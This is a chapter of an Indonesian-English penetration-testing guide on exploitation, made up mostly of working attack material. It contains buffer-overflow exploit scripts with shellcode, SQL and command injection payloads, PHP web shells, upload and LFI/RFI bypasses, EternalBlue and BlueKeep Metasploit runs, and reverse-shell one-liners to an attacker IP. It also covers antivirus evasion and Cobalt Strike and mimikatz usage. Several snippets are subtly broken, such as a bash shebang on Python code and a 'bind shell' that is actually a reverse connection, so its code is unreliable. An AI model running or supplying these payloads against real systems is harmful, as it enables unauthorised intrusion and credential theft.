# 2.2 Exploitation Techniques

Exploitation adalah proses memanfaatkan vulnerabilities untuk mendapatkan akses tidak sah ke sistem. Ini adalah langkah aktif di mana attacker mencapai goals mereka.

## Prerequisites untuk Successful Exploitation

1. **Validated Vulnerability** - Pastikan vulnerability benar-benar ada
2. **Correct Target** - Verify service/version yang vulnerable
3. **Proper Exploit** - Pilih exploit yang tepat untuk target
4. **Network Access** - Pastikan network connectivity
5. **Payload Preparation** - Siapkan appropriate payload

## Buffer Overflow Exploitation

### Windows Buffer Overflow

#### Langkah 1 - Fuzzing untuk menemukan offset

```bash
# Create fuzzing script
#!/bin/bash
# fuzz.py - Python script untuk fuzzing
import socket

ip = "192.168.1.10"
port = 9999

prefix = "OVERFLOW1 "
offset = 0
buffer = ""

while True:
    try:
        buffer = prefix + "A" * offset
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((buffer + "\r\n"))
        s.close()
        offset += 100
        print "Fuzzing with %d bytes" % offset
    except:
        print "Crashed at %d bytes" % offset
        break
```

#### Langkah 2 - Pattern Creation dan Offset Finding

```bash
# Create pattern 2000 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9...

# Terima pattern dari program crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6f433962
[*] Exact match at offset 1978
```

#### Langkah 3 - Bad Character Identification

```bash
# Generate byte array untuk testing bad characters
#!/usr/bin/python
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
# ... lengkapkan semua bytes kecuali \x00
"\xff"
)

print badchars
```

#### Langkah 4 - Jump Point dan Shellcode

```bash
# Find JMP ESP instruction
# Dengan mona di Immunity Debugger:
!mona jmp -r esp -m "essfunc.dll"

# Atau cari manual dengan objdump
objdump -D /usr/share/metasploit-framework/data/exploits/pattern_create.rb | grep jmp
```

#### Langkah 5 - Full Exploit Development

```python
#!/usr/bin/python
import socket
import struct

# Configuration
ip = "192.168.1.10"
port = 9999
offset = 1978
retn = 0x625011af  # JMP ESP address

# Bad characters
badchars = "\x00\x0a\x0d"

# Generate shellcode (msfvenom)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f python

shellcode = (
"\xbf\xa9\x81\x9e\x5a\xdd\xc8\xd9\x74\x24\xf4\x5d\x33\xc9"
"\xb1\x56\x83\xed\xfc\x31\x7d\x14\x03\x7d\x9c\x81\x6d\xde"
# ... complete shellcode
)

payload = ""
payload += "A" * offset
payload += struct.pack("<I", retn)
payload += "\x90" * 16  # NOP sled
payload += shellcode
payload += "C" * (3000 - len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send((payload + "\r\n"))
    s.close()
except:
    print "Failed to connect"
```

### Linux Buffer Overflow

#### Exploit untuk SUID binaries

```bash
# Compile vulnerable program
gcc -fno-stack-protector -z execstack -o vuln vuln.c

# Generate shellcode untuk Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f py

# NOP sled
nopsled = "\x90" * 32

# JMP ESP address (example)
ret_addr = struct.pack("<I", 0x77c35459)

# Complete payload
payload = nopsled + shellcode + "A" * (100 - len(nopsled) - len(shellcode))
```

## Web Application Exploitation

### SQL Injection Exploitation

#### Union-Based SQL Injection

```bash
# Determine number of columns
http://target.com/page.php?id=1' ORDER BY 1--
http://target.com/page.php?id=1' ORDER BY 2--
http://target.com/page.php?id=1' ORDER BY 3--  # Error berarti 2 columns

# Union injection untuk mendapatkan database info
http://target.com/page.php?id=-1' UNION SELECT 1,database()--
http://target.com/page.php?id=-1' UNION SELECT 1,user()--
http://target.com/page.php?id=-1' UNION SELECT 1,@@version--

# Get table names
http://target.com/page.php?id=-1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='database_name'--

# Get column names
http://target.com/page.php?id=-1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--

# Extract data
http://target.com/page.php?id=-1' UNION SELECT 1,username FROM users--
http://target.com/page.php?id=-1' UNION SELECT 1,password FROM users--
```

#### Error-Based SQL Injection

```bash
# MySQL error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# Extract database names
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT schema_name FROM information_schema.schemata LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# Extract table names
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

#### Time-Based Blind SQL Injection

```bash
# Time-based injection dengan sleep
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

# Boolean-based blind untuk string extraction
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
# Tambahkan sleep untuk verify:
' AND (SELECT IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) FROM users WHERE username='admin')--
```

#### File-Based SQL Injection

```bash
# Read file via SQL injection
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --

# Write web shell via SQL injection
' UNION SELECT '<?php system($_GET["cmd"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php' --

# Alternative write method:
' UNION SELECT 'system($_GET["cmd"]);',2,3 INTO OUTFILE '/var/www/html/cmd.php'
# Kemudian tambah PHP tags:
# Edit file: <?php system($_GET["cmd"]); ?>
```

### Command Injection Exploitation

```bash
# Basic command injection
; whoami
&& id
| cat /etc/passwd
`whoami`
$(id)

# Command injection dalam web parameter
http://target.com/page.php?cmd=127.0.0.1; whoami

# Blind command injection
; sleep 10
&& ping -c 10 127.0.0.1

# Command injection dengan filter bypass
; w\hoami
&& cat /etc/passw\d
| `w\h\o\a\m\i`

# Command chaining dengan pipeline
cat /etc/passwd | grep root
whoami && hostname && ip addr
```

### File Upload Exploitation

#### PHP Web Shell Upload

```bash
# Create simple PHP web shell
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

# Advanced web shell dengan password protection
<?php
if(isset($_POST['pass']) && $_POST['pass'] == 'secretpassword') {
    if(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
}
?>
<form method="post">
Password: <input type="password" name="pass"><br>
Command: <input type="text" name="cmd"><br>
<input type="submit" value="Execute">
</form>
```

#### File Upload Bypass Techniques

```bash
# Extension bypass
shell.php -> shell.php5, shell.phtml, shell.php3

# Double extension
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# Magic bytes untuk bypass content-type
# Add GIF header:
GIF89a<?php system($_GET['cmd']); ?>

# Case sensitivity
shell.PHP

# Space trimming
shell.php

# Alternate data streams (Windows)
echo '<?php system($_GET['cmd']); ?>' > shell.php:shell.txt
```

### Local File Inclusion (LFI) Exploitation

```bash
# Basic LFI
http://target.com/index.php?page=/etc/passwd

# LFI dengan path traversal
http://target.com/index.php?page=../../../../../../etc/passwd

# LFI dengan log poisoning
# Inject PHP code ke log:
curl http://target.com -H "User-Agent: <?php system($_GET['cmd']); ?>"
# Include log file:
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami

# LFI dengan /proc/self/environ
# Modify User-Agent header:
curl http://target.com -H "User-Agent: <?php system($_GET['cmd']); ?>"
http://target.com/index.php?page=/proc/self/environ&cmd=whoami

# LFI untuk RCE dengan php://input
# POST request ke:
http://target.com/index.php?page=php://input
# Dengan POST data:
<?php system($_GET['cmd']); ?>
# Kemudian:
http://target.com/index.php?page=php://input&cmd=whoami
```

### Remote File Inclusion (RFI) Exploitation

```bash
# Basic RFI
http://target.com/index.php?page=http://attacker.com/shell.txt

# RFI dengan protocol wrapper
http://target.com/index.php?page=expect://id
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# RFI dengan PHP filter
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
```

## Network Service Exploitation

### SMB Exploitation

#### EternalBlue (MS17-010)

```bash
# Check vulnerability
nmap --script smb-vuln-ms17-010 target.com

# Exploit dengan Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST 192.168.1.100
exploit

# Atau gunakan python exploit
python2 ms17-010.py target.com
```

#### SMB Relay Attack

```bash
# Setup SMB relay
responder -I eth0

# Setelah dapat NTLM hash, relay dengan:
ntlmrelayx.py -tf targets.txt -smb2support
```

### SSH Exploitation

#### Weak SSH Credentials

```bash
# SSH brute force
medusa -H target.txt -U users.txt -P passwords.txt -M ssh
hydra -l admin -P passwords.txt ssh://target.com

# SSH key exploitation
# Jika dapat private key:
ssh -i id_rsa user@target

# Jika private key encrypted:
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=wordlist.txt
```

#### SSH Key Reuse

```bash
# Test SSH key pada multiple hosts
#!/bin/bash
for ip in $(cat hosts.txt); do
    echo "Testing $ip"
    timeout 5 ssh -o StrictHostKeyChecking=no -i id_rsa root@$ip "whoami"
done
```

### FTP Exploitation

#### Anonymous FTP Exploitation

```bash
# Check anonymous access
ftp target.com
Username: anonymous
Password: anonymous@email.com

# Check write permissions
ls -la
put test.txt

# Upload web shell jika accessible web root
put shell.php
# Atau:
put reverse.exe
# Kemudian execute:
quote site exec cmd.exe
```

### RDP Exploitation

#### BlueKeep (CVE-2019-0708)

```bash
# Check vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 target.com

# Exploit dengan Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target.com
set LHOST 192.168.1.100
exploit
```

## Exploitation Frameworks

### Metasploit Framework

```bash
# Basic workflow
msfconsole
search exploit_name
use exploit/path/to/exploit
show options
set RHOSTS target_ip
set LHOST attacker_ip
set LPORT 4444
check  # Validate vulnerability
exploit

# Multi-handler untuk multiple connections
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j

# Generate payload dengan msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload
```

### Empire PowerShell

```powershell
# Create listener
listeners --http http://192.168.1.100

# Generate launcher
launcher powershell http://192.168.1.100

# Common modules
usemodule situational_awareness/host/computerdetails
usemodule situational_awareness/host/getsysteminfo
usemodule credentials/mimikatz/logonpasswords
```

### Cobalt Strike

```bash
# Create listener
./teamserver 192.168.1.100 password

# Generate payload
./cobaltstrike
Attacks > Packages > Windows Executable (S)

# Beacon commands
beacon> help
beacon> pwd
beacon> ls
beacon> execute-assembly C:\tools\Seatbelt.exe
```

## Custom Exploit Development

### Python Socket Exploit

```python
#!/usr/bin/python
import socket
import struct
import time

def exploit(target_ip, target_port):
    try:
        # Connect ke target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Receive banner
        banner = s.recv(1024)
        print "[+] Banner:", banner

        # Send exploit payload
        payload = "A" * 1000 + "B" * 4 + "C" * 500
        s.send(payload + "\r\n")

        # Check response
        response = s.recv(1024)
        print "[+] Response:", response

        s.close()
        return True
    except Exception as e:
        print "[-] Error:", str(e)
        return False

# Usage
target = "192.168.1.10"
port = 9999
exploit(target, port)
```

### Buffer Overflow dengan Memory Protection Bypass

```python
#!/usr/bin/python
import struct
import subprocess

# Disable ASLR (Linux)
subprocess.call("echo 0 > /proc/sys/kernel/randomize_va_space", shell=True)

# ROP chain untuk bypass DEP
rop_chain = [
    0x0806f650,  # pop eax; ret
    0x080d0080,  # &.data section
    0x080a7d91,  # pop ebx; ret
    0x00000010,  # size
    0x080865c0,  # pop ecx; ret
    0x080d0080,  # destination
    0x08055b80,  # pop edx; ret
    0x0000000c,  # PROT_READ|PROT_WRITE|PROT_EXEC
    0x080562e0,  # mprotect
    0x0806f650,  # pop eax; ret
    0x080d0080,  # shellcode address
    0x080491f3   # jmp eax
]

# Build final payload
payload = "A" * offset
for addr in rop_chain:
    payload += struct.pack("<I", addr)
payload += shellcode
```

## Post-Exploitation Payloads

### Reverse Shell Payloads

```bash
# Netcat reverse shell
nc -nvlp 4444
# Di target:
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# PHP reverse shell
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shell Payloads

```bash
# Netcat bind shell
nc -nlvp 4444
# Di target:
nc -e /bin/sh 192.168.1.100 4444

# Python bind shell
python -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
```

## Exploitation Tips & Tricks

### Bypassing Security Controls

```bash
# Antivirus evasion dengan encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# Firewall evasion dengan port 53/443
use exploit/windows/smb/ms17_010_eternalblue
set LPORT 53
set LHOST 192.168.1.100

# IDS/IPS evasion dengan fragmentation
nmap -sS -f target.com

# Time-based evasion dengan delays
python -c 'import time; time.sleep(30); exec(open("exploit.py").read())'
```

### Debugging Exploits

```bash
# Enable core dumps untuk debugging
ulimit -c unlimited
echo "/tmp/core.%e.%p" > /proc/sys/kernel/core_pattern

# Use GDB untuk debugging
gdb -tui ./vulnerable_program
(gdb) run $(python -c 'print "A"*200')
(gdb) bt  # Backtrace
(gdb) info registers  # Check register states

# Pattern di debugger
(gdb) run $(python -c 'print "Aa0Aa1Aa2..."')
(gdb) x/200x $esp  # Check stack
```

## Important Considerations

1. **Legal Compliance** - Pastikan ada authorization
2. **Impact Assessment** - Understand potential damage
3. **Backup Systems** - Have recovery plan ready
4. **Documentation** - Record all steps and results
5. **Ethical Conduct** - Follow responsible disclosure

## Common Pitfalls

1. **Bad Characters** - Character filtering breaking shellcode
2. **ASLR/DEP** - Memory protection stopping exploitation
3. **Service Crashes** - Exploit causing service to crash
4. **Network Filtering** - IDS/IPS blocking exploitation
5. **Incomplete Exploitation** - Partial success but no shell

Exploitation adalah complex skill yang membutuhkan deep understanding dari systems, vulnerabilities, dan defensive measures. Always validate vulnerabilities before exploitation dan prioritize safety dan stability.